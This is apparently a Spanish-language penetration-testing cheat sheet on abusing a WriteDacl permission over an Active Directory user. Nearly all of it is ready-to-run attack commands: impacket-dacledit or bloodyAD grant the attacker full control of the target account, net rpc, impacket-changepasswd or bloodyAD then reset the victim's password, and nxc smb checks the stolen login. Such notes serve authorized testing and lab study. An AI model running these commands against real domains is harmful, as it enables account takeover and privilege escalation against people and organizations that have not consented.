# Abuso ACL 

Tags: #AD #ACL #Windows 

## WriteDalc sobre Usuario 

Si tenemos esta ACL sobre un usuario, podemos modificar su ACL para otorgarnos permisos que permitan realizar acciones sobre ese usuario, como ResetPassword, y posteriormente cambiar su contraseña.

```powershell
Paso 1:
# Agregar GenericAll sobre el target
❯ impacket-dacledit -action write -rights FullControl -principal ControlledAccount -target TargetUser 'domain.local/ControlledAccount:Password' -dc-ip IP_DC

	# ControlledAccount = Usuario atacante (Controlas)
	# p = Contraseña del usuario atacante 
	# TargetUser = Usuario víctima (Objetivo) 

# Otra forma de hacerlo
❯ bloodyAD -u ControlledAccount -p 'Password' -d domain.local --host IP_DC add genericAll TargetUser
```

```powershell
Paso 2:
# Cambiar la contraseña del target:
❯ net rpc password TargetUser 'P@$$w0rd123!' -U 'domain.local/ControlledAccount%Password' -S IP_DC

	# TargetUser = Usuario víctima (Objetivo)
	# P@$$w0rd123! = Contraseña nueva que se le va a asignar 
	# ControlledAccount = Usuario atacante (Controlas)
	
# Otra forma de hacerlo y cambiar la password 
❯ impacket-changepasswd 'domain.local/TargetUser:OldPass@NewPass123!' -dc-ip IP_DC
❯ bloodyAD -u ControlledAccount -p 'Password' -d domain.local --host IP_DC set password TargetUser 'P@$$w0rd123!'
```

```bash 
Paso 3:
# Verificar el cambio de password 
❯ nxc smb IP_DC -u user -p 'P@$$w0rd123!' 
```